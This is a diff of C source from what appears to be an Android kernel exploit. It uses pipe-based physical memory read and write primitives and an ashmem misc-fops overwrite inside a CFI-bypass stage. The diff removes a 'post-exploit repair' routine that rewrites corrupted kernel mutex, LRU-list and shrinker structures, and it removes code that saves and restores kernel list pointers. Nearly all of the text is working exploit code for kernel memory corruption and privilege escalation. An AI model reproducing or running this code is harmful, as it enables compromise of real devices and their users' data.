@@ -101,175 +101,6 @@ static int fake_fops_owner_is_zero(int fd) {
 }
 
 #if defined(ASHMEM_MUTEX_OFF)
-
-#define MUTEX_SIZE          48
-#define MUTEX_OWNER_OFF     0
-#define MUTEX_WAITLOCK_OFF  8
-#define MUTEX_OSQ_OFF       12
-#define MUTEX_WAITLIST_OFF  16
-#define MUTEX_OEM_OFF       32
-
-static int is_kernel_ptr(uint64_t val) {
-  return (val & 0xffff000000000000ULL) == 0xffff000000000000ULL;
-}
-
-static int mutex_looks_corrupt(const uint8_t *buf) {
-  uint64_t owner;
-  memcpy(&owner, buf + MUTEX_OWNER_OFF, 8);
-  if (owner != 0 && !is_kernel_ptr(owner)) {
-    return 1;
-  }
-  uint64_t wl_next;
-  memcpy(&wl_next, buf + MUTEX_WAITLIST_OFF, 8);
-  if (wl_next != 0 && !is_kernel_ptr(wl_next)) {
-    return 1;
-  }
-  return 0;
-}
-
-static int repair_ashmem_mutex(int fd) {
-  uintptr_t mutex_direct = data_addr(ASHMEM_MUTEX);
-  uintptr_t mutex_canon = canon_addr(ASHMEM_MUTEX);
-
-  uint8_t buf[MUTEX_SIZE];
-  memset(buf, 0, sizeof(buf));
-
-  if (!pipe_phys_read_data(fd, mutex_direct, buf, MUTEX_SIZE)) {
-    pr_warning("ashmem-repair: failed to read mutex at direct=%016zx\n",
-               mutex_direct);
-    return 0;
-  }
-
-  if (!mutex_looks_corrupt(buf)) {
-    pr_info("ashmem-repair: mutex looks clean, skipping repair\n");
-    return 1;
-  }
-
-  uint64_t owner;
-  memcpy(&owner, buf + MUTEX_OWNER_OFF, 8);
-  uint64_t wl_next;
-  memcpy(&wl_next, buf + MUTEX_WAITLIST_OFF, 8);
-  pr_warning("ashmem-repair: CORRUPT mutex owner=%016llx waitlist.next=%016llx\n",
-             (unsigned long long)owner, (unsigned long long)wl_next);
-
-  uint8_t clean[MUTEX_SIZE];
-  memset(clean, 0, sizeof(clean));
-  uint64_t self = mutex_canon + MUTEX_WAITLIST_OFF;
-  memcpy(clean + MUTEX_WAITLIST_OFF, &self, 8);
-  memcpy(clean + MUTEX_WAITLIST_OFF + 8, &self, 8);
-
-  if (!pipe_phys_write_data(fd, mutex_direct, clean, MUTEX_SIZE)) {
-    pr_warning("ashmem-repair: failed to write clean mutex\n");
-    return 0;
-  }
-
-  uint8_t verify[MUTEX_SIZE];
-  memset(verify, 0, sizeof(verify));
-  if (!pipe_phys_read_data(fd, mutex_direct, verify, MUTEX_SIZE)) {
-    pr_warning("ashmem-repair: failed to read back mutex\n");
-    return 0;
-  }
-
-  if (memcmp(clean, verify, MUTEX_SIZE) != 0) {
-    pr_warning("ashmem-repair: readback mismatch\n");
-    return 0;
-  }
-
-  pr_success("ashmem-repair: mutex repaired at %016zx\n", mutex_direct);
-  return 1;
-}
-
-static int repair_ashmem_lru_list(int fd) {
-  uintptr_t lru_direct = data_addr(ASHMEM_LRU_LIST);
-  uintptr_t lru_canon = canon_addr(ASHMEM_LRU_LIST);
-
-  uint8_t buf[16];
-  if (!pipe_phys_read_data(fd, lru_direct, buf, 16)) {
-    pr_warning("ashmem-repair: failed to read lru_list\n");
-    return 0;
-  }
-
-  uint64_t next, prev;
-  memcpy(&next, buf, 8);
-  memcpy(&prev, buf + 8, 8);
-
-  pr_info("ashmem-repair lru_list next=%016llx prev=%016llx\n",
-          (unsigned long long)next, (unsigned long long)prev);
-
-  if (next != 0 && !is_kernel_ptr(next)) {
-    pr_warning("ashmem-repair: lru_list corrupted, resetting to empty\n");
-    uint64_t self = lru_canon;
-    uint8_t clean[16];
-    memcpy(clean, &self, 8);
-    memcpy(clean + 8, &self, 8);
-    if (!pipe_phys_write_data(fd, lru_direct, clean, 16)) {
-      pr_warning("ashmem-repair: failed to write lru_list\n");
-      return 0;
-    }
-    pr_success("ashmem-repair: lru_list repaired\n");
-  }
-  return 1;
-}
-
-#if defined(ASHMEM_SHRINKER_OFF)
-static int check_ashmem_shrinker(int fd) {
-  uintptr_t shrinker_direct = data_addr(ASHMEM_SHRINKER);
-  uint64_t count_fn = 0, scan_fn = 0;
-
-  if (!pipe_phys_read_data(fd, shrinker_direct, &count_fn, 8) ||
-      !pipe_phys_read_data(fd, shrinker_direct + 8, &scan_fn, 8)) {
-    pr_warning("ashmem-repair: shrinker read failed\n");
-    return 0;
-  }
-
-  pr_info("ashmem-repair: shrinker count_fn=%016llx scan_fn=%016llx\n",
-          (unsigned long long)count_fn, (unsigned long long)scan_fn);
-
-  int count_ok = is_kernel_ptr(count_fn) || count_fn == 0;
-  int scan_ok = is_kernel_ptr(scan_fn) || scan_fn == 0;
-
-  if (!count_ok || !scan_ok) {
-    pr_warning("ashmem-repair: shrinker CORRUPT count_ok=%d scan_ok=%d\n",
-               count_ok, scan_ok);
-  } else {
-    pr_info("ashmem-repair: shrinker looks clean\n");
-  }
-  return count_ok && scan_ok;
-}
-#endif
-
-static int repair_ashmem_region(int fd) {
-  pr_info("ashmem-repair: === .data region repair ===\n");
-  pr_info("ashmem-repair: mutex direct=%016zx canon=%016zx\n",
-          data_addr(ASHMEM_MUTEX), canon_addr(ASHMEM_MUTEX));
-  pr_info("ashmem-repair: lru   direct=%016zx canon=%016zx\n",
-          data_addr(ASHMEM_LRU_LIST), canon_addr(ASHMEM_LRU_LIST));
-#if defined(ASHMEM_SHRINKER_OFF)
-  pr_info("ashmem-repair: shrnk direct=%016zx canon=%016zx\n",
-          data_addr(ASHMEM_SHRINKER), canon_addr(ASHMEM_SHRINKER));
-#endif
-
-  int mutex_ok = repair_ashmem_mutex(fd);
-  int lru_ok = repair_ashmem_lru_list(fd);
-#if defined(ASHMEM_SHRINKER_OFF)
-  int shrinker_ok = check_ashmem_shrinker(fd);
-#else
-  int shrinker_ok = 1;
-#endif
-
-  if (mutex_ok && lru_ok && shrinker_ok) {
-    pr_success("ashmem-repair: .data region all clean/repaired\n");
-  } else {
-    pr_warning("ashmem-repair: .data region issues mutex=%d lru=%d shrinker=%d\n",
-               mutex_ok, lru_ok, shrinker_ok);
-  }
-  return mutex_ok;
-}
-
-static void run_post_exploit_repair(int fd) {
-  repair_ashmem_region(fd);
-}
-
 #endif
 
 #if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
@@ -526,13 +357,6 @@ int try_cfi_stage(void) {
     return 0;
   }
   uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
-  uintptr_t misc_fops_direct = data_direct_addr(ASHMEM_MISC_FOPS);
-  uint64_t saved_misc_list[2] = {0, 0};
-  pipe_phys_read_data(fd, misc_fops_direct + 8, &saved_misc_list, sizeof(saved_misc_list));
-  pr_info("cfi saved misc_list next=%016llx prev=%016llx direct=%016zx\n",
-          (unsigned long long)saved_misc_list[0],
-          (unsigned long long)saved_misc_list[1],
-          misc_fops_direct + 8);
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
@@ -626,16 +450,6 @@ int try_cfi_stage(void) {
     cfi_last_step = 5;
     cfi_last_errno = errno;
     goto fail;
-  }
-
-  if (saved_misc_list[0] != 0 || saved_misc_list[1] != 0) {
-    int lr = pipe_phys_write_data(fd, misc_fops_direct + 8,
-                                  &saved_misc_list, sizeof(saved_misc_list));
-    pr_info("cfi restored misc_list write=%d next=%016llx prev=%016llx\n",
-            lr, (unsigned long long)saved_misc_list[0],
-            (unsigned long long)saved_misc_list[1]);
-  } else {
-    pr_warning("cfi misc_list was zero — read may have used wrong address space\n");
   }
 
   uint64_t before = 0;
@@ -742,9 +556,6 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
-#if defined(ASHMEM_MUTEX_OFF)
-  run_post_exploit_repair(fd);
-#endif
 
   uint64_t after = 0;
   ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
